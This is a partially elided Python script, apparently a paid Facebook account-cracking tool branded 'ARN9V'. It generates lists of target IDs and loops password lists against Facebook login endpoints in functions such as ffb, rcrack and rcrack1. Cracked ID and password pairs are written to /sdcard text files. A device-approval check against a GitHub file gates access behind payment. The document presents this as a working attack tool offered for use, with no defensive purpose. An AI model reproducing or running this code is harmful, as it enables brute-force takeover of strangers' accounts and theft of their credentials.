...
import os,base64
os.system("xdg-open https://www.facebook.com/arnav.H3R3/?ref=share")
...
try:
	...
	os.system('python ARN9V.py')
android_models=[]
try:
	xx = requests.get('https://github.com/ARN9VH3R3/Approvals/blob/main/Approval.txt').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://github.com/ARN9VH3R3/Approvals/blob/main/Approval.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/ARN9VH3R3/Approvals/blob/main/Approval.txt').text
		ua=open('.bbnew.txt','w')
...
--------------------------------------------------
\033[1;38mCREATED BY     : \033[1;32m 9R49V H3R3\033[1;32m
\033[1;38mFACEBOOK       : \033[1;32mARNAV CHAULAGAI\033[1;32m
\033[1;38mYOUTUBE        : \033[1;32mNXAINA \033[1;32m
\033[1;38mSTATUS         : \033[1;32mPAID\033[1;32m
--------------------------------------------------
\033[1;38mK1NGX MR  ARN9V
\033[1;38mF33L M33 H4T3RS
\033[1;38mVERSION 10.2
--------------------------------------------------""")
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/ARNAV.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    try:
        ...
        limit = 1
    print('\n \033[1;32mExample: /sdcard/ARNAV.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/ARN9V.txt\033[0;97m')
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://www.facebook.com/arnav.H3R3');menu()
...
def gmail():
		...
		clear()
		print('\033[1;32m example: ARNAV , YASHII , NIRMAL , MANISH , ABHISHEK ETC...\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;32m example: CHAULAGAI , NEUPANE , SUNAR , BISTA  ETC.... \033[1;97m')
		linex()
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [ARN9V] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [ARN9V-0K] %s | %s'%(ids,pas))
				open('/sdcard/ARN9V-0K.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [ARN9V-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/ARN9V-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [ARN9V-0K] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/ARN9V-0K.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [ARN9V] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;32m [ARN9V-0K] '+ids+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [ARN9V-0K] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/ARN9VH3R3/Approvals/blob/main/Approval.txt').text
...
--------------------------------------------------
\033[1;38mCREATED BY     : \033[1;32mARNAV H3R3\033[1;32m
\033[1;38mFACEBOOK       : \033[1;32mARNAV HOO..\033[1;32m
\033[1;38mYOUTUBE        : \033[1;32m XAINA\033[1;32m
\033[1;38mSTATUS         : \033[1;32mPAID\033[1;32m
--------------------------------------------------
\033[1;38mK1NGX MR  ARN9V
\033[1;38mF33L M33 H4T3RS
...
==================================================   """)
  ...
  os.system('xdg-open https://www.facebook.com/arnav.H3R3')
  print("");time.sleep(2)
  print("\x1b[1;32m  CHECKING YOUR APROVAL.............                                                ");time.sleep (0.5)
  try:
    httpCaht = requests.get("https://github.com/ARN9VH3R3/Approvals/blob/main/Approval.txt").text
    if id in httpCaht:
      ...
      print("\x1b[1;32m    Sorry Bro Token Key not Aproved 🥺")
...
def tnx():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print("\x1b[1;32m    Sorry Bro Your Token not Aproved 🥺 ")
      print("    Send payment to Admin and get aproval"); time.sleep(2)
      os.system('xdg-open https://www.facebook.com/arnav.H3R3')
      time.sleep(2)
      sys.exit()
